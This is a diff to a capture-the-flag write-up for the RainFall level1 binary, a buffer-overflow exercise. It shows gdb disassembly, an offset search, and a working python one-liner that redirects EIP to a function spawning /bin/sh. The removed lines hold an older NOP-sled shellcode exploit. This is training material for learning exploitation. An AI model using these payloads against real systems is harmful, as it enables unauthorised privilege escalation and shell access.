@@ -37,6 +37,17 @@ Ok so we can crash the program with an executable.
 
 Let's open gdb to get more information on that level1:
 
+(gdb) info function
+All defined functions:
+
+Non-debugging symbols:
+...
+0x08048444  run
+0x08048480  main
+...
+
+We can see the main function and an other one : run
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x08048480 <+0>:	push   %ebp
@@ -49,28 +60,35 @@ Dump of assembler code for function main:
    0x08048495 <+21>:	leave
    0x08048496 <+22>:	ret
 End of assembler dump.
-(gdb)
-
-There is a call to gets :
-
-(gdb) disas gets
-Dump of assembler code for function gets@plt:
-   0x08048340 <+0>:	jmp    *0x8049798
-   0x08048346 <+6>:	push   $0x0
-   0x0804834b <+11>:	jmp    0x8048330
+(gdb) disas run
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	sub    $0x18,%esp
+   0x0804844a <+6>:	mov    0x80497c0,%eax
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax
+   0x08048456 <+18>:	mov    %edx,0xc(%esp)
+   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
+   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
+   0x0804846a <+38>:	mov    %eax,(%esp)
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+   0x0804847e <+58>:	leave
+   0x0804847f <+59>:	ret
 End of assembler dump.
-(gdb)
 
-From the man :
+In the run function there is a call to system :
 
-"gets() reads a line from stdin into the buffer pointed to by s until either a 
-terminating newline or EOF, which it replaces with a null byte (aq\0aq). 
-No check for buffer overrun is performed"
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
 
-That's interesting, this is our lead to pass this level, we can use a buffer 
-overflow to exploit the executable.
+It's argument is : 
 
-We need to get access to /home/user/level2/.pass remember ?
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+
+(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
 
 When we've got a segmentation fault, it means that our buffer overflowed.
 But from where does it overflow ?
@@ -111,55 +129,14 @@ Reversing the endianess : c5Ac and indeed in your input string :
 Aa0Aa1Aa2iAa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
 Ac | 6Ac7Ac8Ac9Ad0Ad1Ad2A
 
-Now that we know the exact offset to get our segfault.
-We need the eip address.
+By filling the buffer we can control the eip.
+We can change eip value to the address of the run function : 0x08048444
 
-To do that we call gdb again, with our offset and print the info frame :
+Let's try it : 
 
-(gdb) break main
-Breakpoint 1 at 0x8048483
-(gdb) r
-Starting program: /home/user/level1/level1
+level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"' ; cat) | ./level1
+Good... Wait what?
+id
+uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
 
-Breakpoint 1, 0x08048483 in main ()
-(gdb) c
-Continuing.
-Aa0Aa1Aa2iAa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
-Ac
-
-Program received signal SIGSEGV, Segmentation fault.
-0x41356341 in ?? ()
-(gdb) info frame
-Stack level 0, frame at 0xbffff714:
- eip = 0x41356341; saved eip 0x63
- called by frame at 0xbffff718
- Arglist at 0xbffff70c, args:
- Locals at 0xbffff70c, Previous frame's sp is 0xbffff714
- Saved registers:
-  eip at 0xbffff710
-
-To give level1 our shellcode address we need to overwrite the eip's one.
-
-From here we can inject our shellcode.
-
-(gdb) x/100x $esp
-0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
-0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141------|
-0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141		|	
-0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141		|	'A' in buffer
-0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141		|
-0xbffff700:	0x41414141	0x41414141	0x41414141	0xbffff730------| -> EIP address overwrote
-0xbffff710:	0x90909090	0x90909090	0x90909090	0x90909090------|
-0xbffff720:	0x90909090	0x90909090	0x90909090	0x90909090		|
-0xbffff730:	0x90909090	0x90909090	0x90909090	0x90909090		|
-0xbffff740:	0x90909090	0x90909090	0x90909090	0x90909090		|	100 'NOP' "\x90"
-0xbffff750:	0x90909090	0x90909090	0x90909090	0x90909090		|
-0xbffff760:	0x90909090	0x90909090	0x90909090	0x90909090		|
-0xbffff770:	0x90909090	0xdb31c031	0x80cd06b0	0x742f6853------| -> Beginning of the shellcode
-0xbffff780:	0x2f687974	0x89766564	0x66c931e3	0xb02712b9
-0xbffff790:	0x3180cd05	0x2f6850c0	0x6868732f	0x6e69622f
-0xbffff7a0:	0x5350e389	0xb099e189	0x0080cd0b	0xbffff8db
-
-python -c 'print "A" * 76 + "\x30\xf7\xff\xbf" +"\x90" * 100 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./level1
-
-Give us a new shell as level2.
+It worked !
